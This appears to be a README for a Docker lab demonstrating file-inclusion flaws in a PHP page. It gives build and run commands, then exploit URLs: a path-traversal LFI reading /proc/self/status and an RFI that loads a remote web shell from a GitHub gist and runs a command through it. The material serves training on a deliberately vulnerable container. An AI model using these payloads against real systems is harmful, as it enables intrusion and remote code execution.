# How to use

## Setup

### Build

```sh
docker build . -t lfi-rfi-demo:v1.0
```

### Start container

```sh
docker run --rm -t -p 8085:80 lfi-rfi-demo:v1.0
```

**Note**: Use `<CTRL+C>` to terminate

## Exploits

### LFI

http://localhost:8085/index.php?language=../../../../../proc/self/status`

### RFI

For instance use

https://gist.github.com/dguerri/148f3053788e0b89eb6d3d86afcdcc46

e.g.:

http://localhost:8085/index.php?language=https://gist.githubusercontent.com/dguerri/148f3053788e0b89eb6d3d86afcdcc46/raw/0993f67f26d0057ad91632d2d82d41e6d7a13524/simple-shell.php&0=ls+-laR+/bin

#### Notes

- Replace `localhost` with the Docker daemon address (victim box).
